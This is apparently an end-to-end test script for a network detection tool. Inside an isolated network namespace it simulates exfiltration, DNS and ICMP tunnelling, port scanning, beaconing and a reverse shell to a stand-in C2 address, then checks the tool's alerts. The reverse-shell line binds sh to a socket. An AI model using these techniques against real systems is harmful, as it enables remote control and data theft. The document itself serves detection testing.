#!/usr/bin/env python3
"""End-to-end test of `ratel watch` on real traffic, without root.

Run via: unshare -rn python3 train/net/sandbox_test.py
Inside a fresh user+network namespace only `lo` exists and we are "root" for it,
so packet capture and socket-destroy events work. Test addresses are put on lo:
the traffic never leaves the namespace. Scenarios: bulk upload to a new host,
DNS tunnel, beaconing, reverse shell, ICMP tunnel, port scan, plus benign
traffic that must NOT alert (a download, normal DNS, a few web-like requests).
"""
import json, os, socket, subprocess, sys, threading, time

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
RATEL = os.path.join(ROOT, "target", "release", "ratel")
SINK, C2, DNS, PINGT, WEB = "203.0.113.9", "198.51.100.7", "10.53.53.53", "192.0.2.10", "192.0.2.80"

def sh(*a):
    subprocess.run(a, check=True)

sh("ip", "link", "set", "lo", "up")
ME = "10.0.0.2"  # "this host": clients connect from here, so server-side sockets look private
for a in (SINK, C2, DNS, PINGT, WEB, ME):
    sh("ip", "addr", "add", a + "/32", "dev", "lo")

def server(host, port, handler):
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port)); s.listen(64)
    def loop():
        while True:
            c, _ = s.accept()
            threading.Thread(target=handler, args=(c,), daemon=True).start()
    threading.Thread(target=loop, daemon=True).start()

def sink(c):
    while c.recv(1 << 16): pass
    c.close()

def web(c):
    c.recv(4096); c.sendall(b"x" * 200_000); c.close()

def c2(c):
    c.sendall(b"sleep 20; exit\n"); time.sleep(25); c.close()

server(SINK, 8443, sink)
server(WEB, 443, web)
server(C2, 4444, c2)

def resolver():
    u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); u.bind((DNS, 53))
    while True:
        q, a = u.recvfrom(2048)
        r = bytearray(q); r[2] |= 0x80; r[3] = (r[3] & 0xF0) | 3  # NXDOMAIN
        u.sendto(bytes(r), a)
threading.Thread(target=resolver, daemon=True).start()

_orig_cc = socket.create_connection
def cc(addr, timeout=None):
    return _orig_cc(addr, timeout=timeout, source_address=(ME, 0))
socket.create_connection = cc

def dnsq(name, qtype=1):
    q = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + b"".join(bytes([len(l)]) + l.encode() for l in name.split(".")) + b"\x00" + qtype.to_bytes(2, "big") + b"\x00\x01"
    u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); u.settimeout(1); u.bind((ME, 0))
    u.sendto(q, (DNS, 53))
    try: u.recv(2048)
    except OSError: pass
    u.close()

# fake notify socket (protocol from ~/Projects/notify-sdk): prints nothing, collects messages
NOTIFY = "/tmp/ratel-sbx-notify.sock"
if os.path.exists(NOTIFY): os.remove(NOTIFY)
received = []
def notify_server():
    srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); srv.bind(NOTIFY); srv.listen()
    while True:
        c, _ = srv.accept(); data = b""
        while chunk := c.recv(65536): data += chunk
        c.close(); received.append(data.decode("utf-8", "replace"))
threading.Thread(target=notify_server, daemon=True).start()
# a folder for the periodic static scan, with one synthetic sample that scores high
SCAN = "/tmp/ratel-sbx-scan"
os.makedirs(SCAN, exist_ok=True)
import shutil; shutil.copy(os.path.join(ROOT, "data/synth/bin/s1_000066"), SCAN + "/dropper")

state = "/tmp/ratel-sbx-state"
os.makedirs(state, exist_ok=True)
for f in os.listdir(state): os.remove(os.path.join(state, f))
w = subprocess.Popen([RATEL, "watch", "--loopback", "--learn-hours", "0", "--json", "--duration", "200",
                      "--state", state, "--interval", "1", "--no-scan-exes", "--record", "/tmp/ratel-sbx-events.jsonl",
                      "--log", "/tmp/ratel-sbx-alerts.jsonl", "--scan-path", SCAN, "--scan-every", "1"],
                     stdout=subprocess.PIPE, text=True, env=dict(os.environ, NOTIFY_SOCKET=NOTIFY))
time.sleep(3)

# ---- benign
for i in range(5):
    dnsq(f"www{i}.example.org")
    s = socket.create_connection((WEB, 443)); s.sendall(b"GET / HTTP/1.1\r\n\r\n")
    while s.recv(65536): pass
    s.close()
# ---- bulk exfil: 80 MB to a never-seen host, odd port
s = socket.create_connection((SINK, 8443)); buf = os.urandom(1 << 20)
for _ in range(80):
    s.sendall(buf); time.sleep(0.12)
s.close()
# ---- DNS tunnel: 60 queries with long random labels, TXT
for i in range(60):
    dnsq(os.urandom(20).hex() + "." + os.urandom(6).hex() + ".t.tunnel-test.net", 16)
    time.sleep(0.05)
# ---- reverse shell: sh with stdin/stdout on a socket to the "C2"
rs = socket.create_connection((C2, 4444))
shp = subprocess.Popen(["sh"], stdin=rs.fileno(), stdout=rs.fileno(), stderr=subprocess.DEVNULL)
# ---- ICMP tunnel-like: big echo payloads
subprocess.Popen(["ping", "-q", "-I", ME, "-s", "900", "-i", "0.2", "-c", "60", PINGT], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
# ---- port scan: 150 ports in a few seconds
for p in range(20000, 20150):
    try:
        x = socket.create_connection((SINK, p), timeout=0.2); x.close()
    except OSError: pass
# ---- beacon: every 6 s, small check-in
for i in range(12):
    try:
        b = socket.create_connection((C2, 4444), timeout=2); b.sendall(b"hi"); b.close()
    except OSError: pass
    time.sleep(5.5)

out, _ = w.communicate()
alerts = [json.loads(l) for l in out.splitlines() if l.startswith("{")]
for a in alerts:
    print(f"{a['severity']:6s} {a['kind']:8s} {a['title']}")
    for e in a["evidence"]: print("        -", e)
time.sleep(1)
print(f"--- {len(received)} XMPP message(s) via the notify socket; first one:")
print(received[0] if received else "(none)")
kinds = {a["kind"] for a in alerts}
want = {"exfil", "dns", "process", "icmp", "scan", "beacon", "file"}
bad = [a for a in alerts if WEB in a["dest"] or "example.org" in a["dest"]]
print("missing:", sorted(want - kinds) or "none", "| false alerts on benign:", len(bad))
sys.exit(0 if want <= kinds and not bad and received else 1)
